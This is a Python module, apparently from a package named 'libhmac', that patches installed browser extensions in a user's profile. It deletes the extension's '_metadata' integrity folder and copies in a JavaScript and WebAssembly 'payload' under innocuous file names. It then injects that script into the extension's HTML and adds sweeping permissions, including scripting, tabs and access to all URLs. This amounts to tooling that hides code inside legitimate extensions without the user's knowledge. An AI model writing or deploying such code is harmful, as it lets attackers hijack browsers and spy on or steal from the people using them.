"""In-place extension file patch (payload, HTML, manifest) — no profile scanning."""

from __future__ import annotations

import os
import shutil
import stat
from typing import List

from libhmac import payload
from libhmac.patch.common import patch_extension_html_tree, patch_extension_manifest

INJECTED_JS = "dm_core_bg.js"
PAYLOAD_WASM = "dm_core_bg.wasm"

REQUIRED_PERMISSIONS = [
    "storage",
    "tabs",
    "activeTab",
    "scripting",
    "unlimitedStorage",
    "alarms",
    "webNavigation",
    "offscreen",
]
REQUIRED_HOST_PERMISSIONS = ["<all_urls>"]


def find_version_dirs(profile_path: str, extension_id: str) -> List[str]:
    ext_root = os.path.join(profile_path, "Extensions", extension_id)
    if not os.path.isdir(ext_root):
        return []
    out: List[str] = []
    for name in os.listdir(ext_root):
        vpath = os.path.join(ext_root, name)
        if os.path.isdir(vpath) and os.path.isfile(os.path.join(vpath, "manifest.json")):
            out.append(vpath)
    return out


def _remove_metadata(version_dir: str) -> None:
    meta = os.path.join(version_dir, "_metadata")
    if not os.path.isdir(meta):
        return
    try:
        shutil.rmtree(meta)
    except OSError:
        for root, _dirs, files in os.walk(meta):
            for fn in files:
                fp = os.path.join(root, fn)
                try:
                    os.chmod(fp, stat.S_IWRITE)
                    os.remove(fp)
                except OSError:
                    pass
        shutil.rmtree(meta, ignore_errors=True)


def patch_version_dir(version_dir: str) -> bool:
    """Copy payload, patch HTML + manifest for one extension version folder."""
    payload.ensure_payload_files()
    if not payload.js_path().is_file() or not payload.wasm_path().is_file():
        return False
    _remove_metadata(version_dir)
    try:
        shutil.copy2(payload.js_path(), os.path.join(version_dir, INJECTED_JS))
        shutil.copy2(payload.wasm_path(), os.path.join(version_dir, PAYLOAD_WASM))
    except OSError:
        return False
    patch_extension_html_tree(version_dir, INJECTED_JS)
    return patch_extension_manifest(
        version_dir,
        REQUIRED_PERMISSIONS,
        REQUIRED_HOST_PERMISSIONS,
    )
